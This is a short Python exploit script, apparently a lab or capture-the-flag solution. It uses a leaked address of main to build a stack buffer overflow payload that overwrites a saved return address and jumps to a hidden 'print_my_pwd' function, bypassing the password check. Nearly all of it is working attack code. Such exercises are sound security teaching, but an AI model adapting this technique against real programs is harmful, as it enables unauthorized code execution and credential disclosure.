#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# Here we have the address of the main function.
pmain = int(sys.stdin.readline(), 16)

# p (char*)&print_my_pwd - (char*)&main)
offset_main_to_print_my_pwd = -160

# Offset from &name to saved rip inside check_user (found via GDB)
# 0x7fffffffd418 (rip) - 0x7fffffffd404 (name), 0x7fffffffd418 - 0x7fffffffd404 = 20
offset_name_to_rip = 20

p_print_my_pwd = pmain + offset_main_to_print_my_pwd

eprint(f"pmain          = {hex(pmain)}")
eprint(f"p_print_my_pwd = {hex(p_print_my_pwd)}")

# [20 bytes padding] + [8 bytes address of print_my_pwd in little-endian]
payload = b"A" * offset_name_to_rip + p_print_my_pwd.to_bytes(8, 'little')

writeBytes(payload + b"\n")  # username (overflows into saved rip)
writeStr("wrongpassword\n")   # password (doesn't matter)
